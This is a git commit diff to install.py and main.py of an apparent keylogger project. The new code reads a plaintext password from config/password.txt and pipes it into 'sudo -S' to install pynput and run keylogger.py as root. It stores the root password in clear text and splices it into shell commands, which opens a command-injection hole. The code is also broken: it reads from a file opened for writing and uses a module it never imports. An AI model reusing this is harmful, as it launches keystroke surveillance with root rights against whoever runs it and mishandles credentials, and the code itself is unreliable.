a6e3eef3dc88ed8069ccaad6d1b7dd2cc8aac659
zeylei <zeyu-lei@uiowa.edu>
2018-04-21 18:43:52 -0500

    fix a bug

--- install.py
+++ install.py
@@ -1,4 +1,12 @@
 import subprocess
 
-subprocess.Popen("easy_install pynput",shell=True)
+
+f = open("config/password.txt","w")
+pw = "password"
+while not password.verify(pw):
+	password.getPassword()
+	pw = f.readline()
+	password.verify(pw)
+
+subprocess.Popen("echo "+pw+" | sudo -S easy_install pynput",shell=True)
 subprocess.Popen("python main.py",shell=True)
--- main.py
+++ main.py
@@ -1,15 +1,10 @@
 import password
 import subprocess
-import platform
-sys = platform.system()
-if sys == "Darwin":
-	f = open("config/password.txt","r")
+
+f = open("config/password.txt","r")
+pw = f.readline()
+while not password.verify(pw):
+	password.getPassword()
 	pw = f.readline()
-	print(password.verify(pw))
-	while not password.verify(pw):
-		password.getPassword()
-		pw = f.readline()
-		password.verify(pw)
-	subprocess.Popen("echo "+pw+" | sudo -S python keylogger.py",shell=True)
-else:
-	subprocess.Popen("python keylogger.py",shell=True)
+	password.verify(pw)
+subprocess.Popen("echo "+pw+" | sudo -S python keylogger.py",shell=True)
